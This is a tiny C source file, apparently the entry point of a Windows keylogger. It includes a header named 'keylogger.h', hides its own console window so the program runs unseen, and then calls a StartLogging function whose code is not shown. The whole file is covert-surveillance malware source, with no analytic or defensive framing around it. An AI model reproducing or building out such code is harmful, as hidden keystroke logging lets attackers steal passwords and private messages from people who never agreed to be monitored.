#include "include/keylogger.h"

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    StartLogging();
    return 0;
}